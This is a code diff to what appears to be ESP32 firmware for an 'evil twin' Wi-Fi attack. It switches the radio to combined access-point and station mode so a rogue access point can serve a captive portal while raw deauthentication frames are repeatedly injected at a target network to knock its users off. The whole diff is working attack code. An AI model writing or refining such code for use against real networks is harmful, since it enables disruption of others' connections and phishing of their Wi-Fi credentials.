@@ -1099,7 +1099,9 @@ static void start_evil_twin_server(void) {
     esp_wifi_set_promiscuous_rx_cb(nullptr);
 
     WiFi.softAPdisconnect(true);
-    WiFi.mode(WIFI_AP);
+    // WIFI_AP_STA: AP serves captive portal, STA (promiscuous) injects deauth frames
+    WiFi.mode(WIFI_AP_STA);
+    WiFi.disconnect();
     delay(200);
 
     // Use standard 192.168.4.1 — required for captive portal detection on Android/iOS/Windows
@@ -1112,6 +1114,9 @@ static void start_evil_twin_server(void) {
     // Wait for AP to fully initialize before starting servers
     uint32_t t = millis();
     while (millis() - t < 2500) yield();
+
+    // Enable promiscuous on STA side for raw frame injection
+    esp_wifi_set_promiscuous(true);
 
     etServer = new AsyncWebServer(80);
 
@@ -1177,8 +1182,9 @@ static void poll_evil_twin(void) {
     uint32_t now = millis();
     if (strlen(et_target_bssid) > 0 && (now - et_deauth_last_ms > 100)) {
         et_deauth_last_ms = now;
+        // Inject via STA interface (promiscuous) while AP serves the captive portal
         for (int i = 0; i < 5; i++) {
-            esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+            esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
         }
         deauth_frames_sent += 5;
     }
@@ -1186,6 +1192,8 @@ static void poll_evil_twin(void) {
 
 static void stop_evil_twin(void) {
     Serial.println("[RECON] Stopping Evil Twin");
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
     if (dnsServer) {
         dnsServer->stop();
         delete dnsServer;
